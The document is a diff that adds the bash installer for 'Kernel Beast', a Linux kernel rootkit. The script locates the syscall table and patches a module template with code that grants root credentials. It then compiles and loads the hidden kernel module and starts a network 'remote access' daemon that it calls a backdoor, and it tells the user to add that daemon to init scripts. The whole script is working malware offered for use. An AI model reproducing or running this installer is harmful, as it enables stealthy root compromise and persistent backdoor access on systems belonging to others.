@@ -1,0 +1,214 @@
+#!/bin/bash
+#Kernel Beast Ver #1.0 Installer
+#Copyright Ph03n1X of IPSECS (c) 2011
+#Get more research of ours http://ipsecs.com
+
+MAKE_FILE="./Makefile"
+TEMP_KFILE="./ipsecs-kbeast-v1.cc1"
+CONF_FILE="./config.h"
+C_KFILE="./dnsmodule.c"
+MOD_KFILE="./dnsmodule.ko"
+MODULE="dnsmodule"
+C_BFILE="./dnsdyn.c"
+EXEC_BFILE="./dnsdynm"
+SYSTEM_MAP_FILE="/boot/System.map-`uname -r`"
+LIB_MODULES="/lib/modules/`uname -r`/build"
+CC_OPTS="-Wall -lssl -lpcap"
+INSTDIR=$(cat $CONF_FILE |awk '/_H4X_PATH_/ {print $3}'|awk -F \" '{print $2}')
+DAEMON_USER=$(cat $CONF_FILE |awk '/_MAGIC_NAME_/ {print $3}'|awk -F \" '{print $2}')
+CURDIR=$(pwd)
+
+function IS_EXIST {
+ if [ ! -f $1 ]
+ then
+  echo "[NOT OK]"
+  exit
+ else
+  echo "[OK]"
+ fi
+}
+
+function CHECK_KERNEL_HEADER {
+ HEADER_DIR=`ls -l $1|awk -F \> '{print $2}'`
+ if [ ! -d $HEADER_DIR ] && [ ! -d $1 ]
+ then
+  echo "[NOT OK] - Please Install!"
+  exit
+ else
+  echo "[OK]"
+ fi
+}
+
+function EXECZ {
+ which $1 > /dev/null
+ if [ $? -ne 0 ]
+ then
+  echo "[NOT OK] - Please Install"
+  exit
+ else
+  EXECZZ=`which $1`
+  echo $EXECZZ
+ fi
+}
+
+function CREATE_DIR {
+ cd .. 
+ if [ -d $INSTDIR ]
+ then
+   rm -rf $INSTDIR
+ fi
+ cp -rf $CURDIR $INSTDIR
+ chmod 777 $INSTDIR
+ if [ $? -eq 0 ]
+ then
+  echo "[OK]"
+ else
+  echo "[NOT OK]"
+  exit
+ fi
+}
+
+function check_kernelver {
+ echo -n "Checking for kernel version : "
+ uname -r|egrep "2.6.18|2.6.2[[:digit:]]|2.6.3[[:digit:]]" > /dev/null 2>&1
+ if [ $? -ne 0 ]
+ then
+   echo "[-] Your kernel version is not currently supported by installer"
+   echo "[+] As a guide for kernel 2.6.9 user, please remove sys_unlinkat"
+   exit
+ else
+   echo "[OK]"
+ fi
+}
+
+function build {
+ echo -n "Checking for Makefile : "; IS_EXIST $MAKE_FILE
+ echo -n "Checking for Network Daemon : "; IS_EXIST $C_BFILE
+ echo -n "Checking for Config File : "; IS_EXIST $CONF_FILE
+ echo -n "Checking for Kernel Header : "; CHECK_KERNEL_HEADER $LIB_MODULES
+ echo -n "Checking for gcc : "; EXECZ "gcc"; GCCZZ=`which 'gcc'`
+ echo -n "Checking for make : "; EXECZ "make"; MAKEZ=`which 'make'`
+ check_kernelver
+ echo -n "Creating Install Directory : "; CREATE_DIR
+ cd $INSTDIR
+ #rm -rf $CURDIR
+ echo -n "Compiling Kernel Module : "
+ $MAKEZ > /dev/null 2>&1
+ IS_EXIST $MOD_KFILE
+ echo -n "Compiling Network Daemon File : "
+ $GCCZZ -o $EXEC_BFILE $CC_OPTS $C_BFILE > /dev/null 2>&1
+ IS_EXIST $EXEC_BFILE
+ echo -n "Inserting Loadable Kernel Module : "
+ insmod $MOD_KFILE > /dev/null 2>&1
+ if [ $? -eq 0 ]
+ then
+  echo "[OK]"
+ else
+  echo "[NOT OK]"
+  exit;
+ fi
+ echo "Running Network Daemon for Remote Access :"
+ su $DAEMON_USER -c $EXEC_BFILE 
+ echo "Build Complete!"
+ echo
+ echo "TO DO : modify init script to load this backdoor at start-up"
+ echo "Example can be found on ./init/ directory"
+}
+
+function clean {
+ echo -n "Checking for make : "; EXECZ "make"; MAKEZ=`which make`
+ echo "Removing Kernel Module"; rmmod $MODULE > /dev/null 2>&1
+ echo "Removing Compiled Kernel Module"
+ $MAKEZ clean > /dev/null 2>&1
+ echo "Stoping Network Daemon"
+ killall -9 `echo $EXEC_BFILE|awk -F / '{print $2}'` >/dev/null 2>&1
+ echo "Removing Backdoor File"
+ rm -f $EXEC_BFILE
+ echo "Removing Installation Directory"
+ rm -rf $INSTDIR
+}
+
+function create_c {
+if [ -z $1 ]
+ then
+  UCRED='current_uid()'
+  NEWCRED='struct cred *new=prepare_creds();if(new){new->uid=0;new->euid=0;new->gid=0;new->egid=0;commit_creds(new);return 0;}'
+  PROCNET='init_net.proc_net'
+  SEQSHOW='seq_ops.show'
+  TASKBYPID='pid_task(find_pid_ns(pid, \&init_pid_ns), PIDTYPE_PID)'
+ else
+  if [ $1 -eq 1 ];
+  then
+    UCRED='current_uid()'
+    NEWCRED='struct cred *new=prepare_creds();if(new){new->uid=0;new->euid=0;new->gid=0;new->egid=0;commit_creds(new);return 0;}'
+    PROCNET='init_net.proc_net'
+    SEQSHOW='seq_ops.show'
+    TASKBYPID='pid_task(find_pid_ns(pid, \&init_pid_ns), PIDTYPE_PID)'
+  elif [ $1 -eq 0 ]
+  then
+    UCRED='current->uid'
+    NEWCRED='current->uid=0;current->euid=0;current->gid=0;current->egid=0;return 0;'
+    PROCNET='proc_net'
+    SEQSHOW='seq_show'
+    TASKBYPID='find_task_by_pid(pid)'
+  else
+    echo "ERROR : Wrong kernel version!"
+    echo
+    exit
+  fi
+ fi
+
+ echo -n "Checking for Kernel Beast : "; IS_EXIST $TEMP_KFILE
+ echo -n "Checking for sed : "; EXECZ "sed"; SEDZZ=`which sed`
+ SYS_CALL_ADDR=`cat $SYSTEM_MAP_FILE|awk '/R sys_call_table/ {print $1}'`
+ echo -n "Generating C file from .cc1 : "
+ $SEDZZ -e "s/SYS_CALL_T_ADDRESS/$SYS_CALL_ADDR/" -e "s/USER_CRED/$UCRED/" \
+ -e "s/PROC_NET/$PROCNET/" -e "s/SEQ_SHOW/$SEQSHOW/" -e "s/CTASK_BY_PID/$TASKBYPID/" \
+ -e "s/NEW_CREDENTIAL/$NEWCRED/" $TEMP_KFILE > $C_KFILE
+ IS_EXIST $C_KFILE
+}
+
+echo "
+:::::::::::  :::::::::    ::::::::   ::::::::::   ::::::::    ::::::::
+    :+:      :+:    :+:  :+:    :+:  :+:         :+:    :+:  :+:    :+:
+    +:+      +:+    +:+  +:+         +:+         +:+         +:+
+    +#+      +#++:++#+   +#++:++#++  +#++:++#    +#+         +#++:++#++
+    +#+      +#+                +#+  +#+         +#+                +#+
+    #+#      #+#         #+#    #+#  #+#         #+#    #+#  #+#    #+#
+###########  ###          ########   ##########   ########    ########
+"
+
+if [ -z $1 ]
+then
+ echo "Usage : $0 <build|clean> [version]"
+ echo
+ echo "build   - to build kernel module, backdoor, and utility"
+ echo "clean   - to remove kernel module, backdoor, and utility"
+ echo "version - 0 : 2.6.18 (RHEL/CentOS 5.x)"
+ echo "          1 : 2.6.32 (Ubuntu 10.x) [default version]"
+ echo
+ exit
+else
+ if [ ! -x /usr/bin/which ]
+ then
+   echo "ERR! Please install which!"
+   exit
+ fi
+ if [ ! -x /bin/egrep ]
+ then
+   echo "ERR! Please install which!"
+   exit
+ fi
+ case $1 in
+ "build")
+   create_c $2
+   build
+  ;;
+ "clean")
+   clean
+  ;;
+ *)
+   echo "ERROR! wrong choice"
+  ;;
+ esac
+fi
